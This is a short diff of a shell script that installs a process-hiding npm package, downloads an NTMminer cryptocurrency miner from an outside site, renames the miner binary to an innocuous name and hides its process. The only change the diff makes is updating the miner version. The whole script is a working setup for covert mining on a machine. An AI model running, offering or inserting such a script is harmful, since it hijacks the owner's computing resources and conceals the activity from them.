@@ -3,8 +3,8 @@ export LC_ALL=C
 export LANG=C
 apt update && apt -y install wget curl sudo nodejs npm
 npm i -g node-process-hider
-wget https://www.ntmminer.com/downloads/NTMminer-noid-v1.1.2-linux-x64.tar.gz
-tar xzf NTMminer-noid-v1.1.2-linux-x64.tar.gz && cd NTMminer-noid-v1.1.2-linux-x64
+wget https://www.ntmminer.com/downloads/NTMminer-noid-v1.1.6-linux-x64.tar.gz
+tar xzf NTMminer-noid-v1.1.6-linux-x64.tar.gz && cd NTMminer-noid-v1.1.6-linux-x64
 mv ntmminer-noid masju
 
 ph add masju
